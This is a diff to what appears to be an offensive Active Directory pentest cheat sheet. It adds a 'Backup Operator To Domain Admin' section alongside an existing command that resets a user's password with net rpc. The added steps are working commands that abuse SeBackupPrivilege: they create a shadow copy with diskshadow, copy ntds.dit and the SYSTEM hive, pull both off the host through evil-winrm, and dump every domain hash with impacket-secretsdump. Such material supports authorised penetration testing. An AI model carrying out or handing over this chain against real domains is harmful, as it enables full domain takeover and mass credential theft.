@@ -530,6 +530,53 @@ proxychains net rpc group members "Domain Admins" -U "<DOMAIN>"/"<USER>"%"<PASSW
 ### ALLExtendedRights
 
 -> Reset password user
-```
+```bash
 net rpc password "<target-user>" "<new-password>" -U "<domain>"/"<user>"%"<password>" -S "<dc-ip>"
 ```
+
+### Backup Operator To Domain Admin
+
+-> Getting information about privileges user
+```powershell
+whoami /all
+```
+```powershell
+SeBackupPrivilege             Enabled Back up files and directories         True
+```
+
+-> Create file
+```bash
+set context persistent nowriters
+add volume c: alias raj
+create
+expose %raj% z:
+```
+
+-> Convert file and upload to target machine
+```bash
+unix2dos raj.dsh
+```
+
+-> After upload file to target execute
+```powershell
+diskshadow /s raj.dsh
+```
+```powershell
+robocopy /b z:\windows\ntds . ntds.dit
+```
+```powershell
+reg save hklm\system c:\Temp\system
+```
+-> download ntds.dit and system by evil-winrm
+```
+download ntds.dit
+download system
+```
+
+-> On kali, crack files by impacket-secretsdump
+```
+impacket-secretsdump -ntds ntds.dit -system system local
+```
+- https://github.com/horizon3ai/backup_dc_registry
+- https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
+- https://github.com/mpgn/BackupOperatorToDA
